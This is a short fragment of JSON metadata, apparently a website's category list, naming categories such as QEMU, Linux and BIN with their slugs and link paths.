/iOS/"},{"name":"QEMU","slug":"QEMU","link":"/categories/QEMU/"},{"name":"Linux","slug":"Linux","link":"/categories/Linux/"},{"name":"BIN","slug":"BIN","link":"/categories/BIN/"}]}